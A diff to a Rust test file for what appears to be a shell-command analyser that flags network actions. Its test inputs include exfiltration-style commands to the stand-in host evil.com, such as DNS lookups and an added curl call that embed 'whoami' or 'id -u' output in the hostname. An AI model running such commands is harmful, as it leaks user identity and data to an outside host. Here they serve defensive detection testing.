@@ -75,11 +75,18 @@ fn a_host_built_at_run_time_names_its_fixed_domain() {
         "host -t txt $CHUNK.evil.com",
         "drill a-$(date +%s).evil.com",
         "getent hosts `whoami`.evil.com",
+        "curl -s https://$(id -u).evil.com/",
     ] {
         let a = parsed(line);
         assert!(has_net(&a, "evil.com"), "{line}: {a:?}");
     }
-    for line in ["dig \"$DOMAIN\"", "dig $X.json", "echo $(whoami).evil.com"] {
+    for line in [
+        "dig \"$DOMAIN\"",
+        "dig $X.json",
+        "echo $(whoami).evil.com",
+        // an HTTP client's URL with a plain variable is decided as before
+        "curl -s https://$BUCKET.evil.com/x",
+    ] {
         let a = parsed(line);
         assert!(
             !a.iter().any(|x| matches!(x, AtomicAction::Net { .. })),
